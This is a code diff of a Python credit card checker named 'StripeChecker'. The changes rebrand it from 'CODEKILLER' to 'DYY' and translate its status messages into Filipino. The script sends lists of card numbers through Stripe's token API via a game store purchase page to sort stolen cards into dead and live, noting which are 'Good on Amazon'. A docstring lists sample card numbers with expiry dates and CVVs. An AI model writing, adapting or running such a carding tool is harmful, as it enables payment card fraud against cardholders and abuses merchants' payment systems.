@@ -21,12 +21,12 @@ fg = [
 ]
 
 '''  ┌───────[ 4447962400608711|06|2021|272 ]──(52)
-     └────────── DEAD >>> Reason: Your card's security code is incorrect.
+     └────────── PATAY >>> Reason: Your card's security code is incorrect.
 ┌───────[ 4447962400608109|06|2021|517 ]──(55)
-└────────── DEAD >>> Reason: Your card's security code is incorrect.
+└────────── PATAY >>> Reason: Your card's security code is incorrect.
 
 ┌───────[ 4447962400604579|06|2021|063 ]──(101)
-└────────── DEAD >>> Reason: Your card's security code is incorrect.
+└────────── PATAY >>> Reason: Your card's security code is incorrect.
      '''
 
 
@@ -37,8 +37,8 @@ class StripeChecker():
         self.purchase = "https://puppetcombo.itch.io/nun-massacre/purchase"
         self.stripe_tokens = "https://api.stripe.com/v1/tokens"
 
-        print("\n\n  {}------=[ {}CODEKILLER CHECKER {}]=------".format(fg[0], fg[1], fg[0]))
-        print("      {}--= {}Created by Codekiller {}=--          ".format(fg[0], fg[1], fg[0]))
+        print("\n\n  {}------=[ {}DYY CHECKER {}]=------".format(fg[0], fg[1], fg[0]))
+        print("      {}--= {}JAMES DYY {}=--          ".format(fg[0], fg[1], fg[0]))
         print("  {}------========================------\n".format(fg[0]))
         self.check()
 
@@ -155,7 +155,7 @@ class StripeChecker():
 
                 if error_msg == "Your card's security code is incorrect.":
                     print(fg[1] + "┌───────[ " + credit_card + " ]──(" + str(credit_entry) + ")")
-                    print(fg[1] + "└────────── LIVE! ~> But Incorrect CVV (Good on Amazon)")
+                    print(fg[1] + "└────────── BUHAY! ~> Mali lang CVV")
 
                 else:
                     print(fg[0] + "┌───────[ " + credit_card + " ]──(" + str(credit_entry) + ")")
@@ -164,7 +164,7 @@ class StripeChecker():
             except Exception as e:
                 print(e)
                 print(fg[1] + "┌───────[ " + credit_card + " ]──(" + str(credit_entry) + ")")
-                print(fg[1] + "└────────── LIVE!")
+                print(fg[1] + "└────────── BUHAY!")
         print()
         print(fg[3] + "[*]" + reset + " Checking Done! " + str(len(cc_list)))
         print()
